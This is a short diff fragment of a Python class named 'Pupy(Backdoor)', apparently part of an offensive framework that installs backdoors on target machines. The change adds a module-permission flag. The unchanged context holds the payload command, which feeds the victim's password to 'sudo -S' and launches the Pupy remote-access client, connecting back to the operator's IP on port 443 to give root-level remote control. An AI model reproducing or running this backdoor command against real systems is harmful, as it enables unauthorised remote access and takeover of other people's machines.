@@ -14,7 +14,7 @@ class Pupy(Backdoor):
         self.enabled_modules = {}
         self.modules = {} 
         self.command = "echo " + self.target.pword + " | sudo -S python pupy/pp.py simple --host " + self.core.localIP + ":443"
-
+        self.allow_modules = True
     def get_value(self, name):
         if name in self.options:
             return self.options[name].value
